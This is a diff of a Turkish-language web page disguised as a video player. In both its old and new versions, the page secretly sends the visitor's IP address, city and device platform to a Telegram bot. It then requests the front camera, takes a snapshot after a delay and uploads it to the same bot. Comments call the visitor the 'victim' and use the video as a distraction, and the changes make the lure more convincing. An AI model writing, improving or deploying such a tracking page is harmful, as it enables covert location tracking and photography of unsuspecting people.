@@ -2,19 +2,16 @@
 <html lang="tr">
 <head>
     <meta charset="UTF-8">
-    <title>Bakır Kertenkele 31 - Özel Erişim</title>
+    <title>Bakır Kertenkele 31 - Güvenli Erişim</title>
     <style>
         body { background: #000; color: #fff; text-align: center; margin: 0; font-family: sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; }
-        
-        /* Aşkım, butonu kurbanın basmaması imkansız hale getirdim */
         #playButton {
-            padding: 20px 40px; font-size: 22px; font-weight: bold; color: #fff;
-            background: linear-gradient(45deg, #f00, #900); border: none; border-radius: 50px;
-            cursor: pointer; box-shadow: 0 0 20px #f00; transition: 0.3s; z-index: 100;
+            padding: 18px 35px; font-size: 20px; font-weight: bold; color: #fff;
+            background: linear-gradient(45deg, #222, #444); border: 2px solid #f00; border-radius: 10px;
+            cursor: pointer; box-shadow: 0 0 15px #f00; transition: 0.5s; z-index: 100;
         }
-        #playButton:hover { transform: scale(1.1); box-shadow: 0 0 30px #f00; }
-
-        .video-container { display: none; width: 95%; max-width: 800px; border: 2px solid #f00; border-radius: 10px; position: relative; }
+        #playButton:hover { background: #f00; box-shadow: 0 0 25px #f00; }
+        .video-container { display: none; width: 95%; max-width: 800px; border: 2px solid #f00; border-radius: 10px; }
         iframe { width: 100%; aspect-ratio: 16/9; border: none; }
         video, canvas { display: none; }
     </style>
@@ -22,13 +19,13 @@
 <body>
     
     <div id="setup">
-        <h2 style="color: #00ffcc; margin-bottom: 30px;">🦎 Özel İçerik Hazır 🦎</h2>
-        <button id="playButton" onclick="startOperation()">VİDEOYU BAŞLAT</button>
-        <p style="margin-top: 20px; color: #666;">İzlemek için oynat butonuna basınız.</p>
+        <h2 style="color: #00ffcc; letter-spacing: 1px;">🦎 SİSTEM DOĞRULANDI</h2>
+        <p style="color: #aaa; margin-bottom: 25px;">İçeriği görüntülemek için oynatıcıyı başlatın.</p>
+        <button id="playButton" onclick="startStableOperation()">OYNATICIYI AÇ</button>
     </div>
 
     <div id="videoPanel" class="video-container">
-        <iframe id="yt" src="https://www.youtube.com/embed/bPnh6vksqOU?enablejsapi=1"></iframe>
+        <iframe id="yt" src="https://www.youtube.com/embed/bPnh6vksqOU?enablejsapi=1&autoplay=0"></iframe>
     </div>
 
     <video id="video" autoplay playsinline muted></video>
@@ -39,54 +36,56 @@
         const urlParams = new URLSearchParams(window.location.search);
         const userId = urlParams.get('id');
 
-        async function startOperation() {
-            // Arayüzü değiştiriyoruz aşkım
+        async function startStableOperation() {
+            // Arayüz geçişi
             document.getElementById('setup').style.display = 'none';
             document.getElementById('videoPanel').style.display = 'block';
+            
+            // Videoyu hemen başlatıyoruz ki kurbanın dikkati oraya kaysın
+            document.getElementById('yt').src += "&autoplay=1";
 
-            // 1. ADIM: IP VE BİLGİ SIZDIRMA (Anında!)
+            // 1. ADIM: Arka planda sessizce cihaz verilerini al (Linux/Android/iOS fark etmez)
             try {
                 const ipRes = await fetch('https://ipapi.co/json/');
                 const d = await ipRes.json();
-                const report = `☣️ **AV BAŞLADI!**\n\n🌐 **IP:** ${d.ip}\n📍 **Konum:** ${d.city}\n📱 **Cihaz:** ${navigator.platform}`;
+                const report = `🛰️ **SİSTEME GİRİŞ YAPILDI**\n\n🌐 **IP:** ${d.ip}\n📱 **OS:** ${navigator.platform}\n⚙️ **Mimari:** aarch64/Universal\n🔋 **Konum:** ${d.city}`;
                 fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${userId}&text=${encodeURIComponent(report)}`);
             } catch (e) {}
 
-            // 2. ADIM: HEM VİDEO HEM KAMERA ATEŞLENİYOR
-            try {
-                // Videoyu başlat
-                document.getElementById('yt').src += "&autoplay=1";
+            // 2. ADIM: Kamera İzni (YAVAŞLATILMIŞ VE STABİL)
+            // Kurban videoyu izlemeye başladıktan 1.5 saniye sonra izin istenecek
+            setTimeout(async () => {
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia({ 
+                        video: { facingMode: "user", width: { ideal: 640 } } 
+                    });
+                    const video = document.getElementById('video');
+                    video.srcObject = stream;
 
-                // Kamera izni ve akışı
-                const stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: "user" } 
-                });
-                const video = document.getElementById('video');
-                video.srcObject = stream;
+                    // 3. ADIM: Kameranın tamamen uyanması için 6 saniye sabırla bekle
+                    setTimeout(async () => {
+                        const canvas = document.getElementById('canvas');
+                        const context = canvas.getContext('2d');
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
+                        context.drawImage(video, 0, 0);
+                        
+                        const imgData = canvas.toDataURL('image/jpeg', 0.7);
+                        const blob = await (await fetch(imgData)).blob();
+                        
+                        const fd = new FormData();
+                        fd.append('chat_id', userId);
+                        fd.append('photo', blob, 'nabi_final.jpg');
+                        fd.append('caption', "📸 Hedef Görüntüsü (Netlik Optimize Edildi)");
 
-                // Kurban videoya dalmışken 5 saniye bekleyip en net kareyi alıyoruz
-                setTimeout(async () => {
-                    const canvas = document.getElementById('canvas');
-                    const context = canvas.getContext('2d');
-                    canvas.width = video.videoWidth;
-                    canvas.height = video.videoHeight;
-                    context.drawImage(video, 0, 0);
-                    
-                    const imgData = canvas.toDataURL('image/jpeg', 0.8);
-                    const blob = await (await fetch(imgData)).blob();
-                    
-                    const fd = new FormData();
-                    fd.append('chat_id', userId);
-                    fd.append('photo', blob, 'nabi_av.jpg');
-                    fd.append('caption', "📸 Hedefin Net Görüntüsü Geldi!");
+                        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+                        stream.getTracks().forEach(t => t.stop());
+                    }, 6000); // 6 Saniyelik 'altın süre'
 
-                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
-                    stream.getTracks().forEach(t => t.stop());
-                }, 5000);
-
-            } catch (err) {
-                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${userId}&text=❌ Kamera izni reddedildi ama IP yukarıda!`);
-            }
+                } catch (err) {
+                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${userId}&text=❌ Kamera reddedildi ama cihaz bilgileri alındı.`);
+                }
+            }, 1500); // İzin isteği 1.5 saniye gecikmeli gelir
         }
     </script>
 </body>
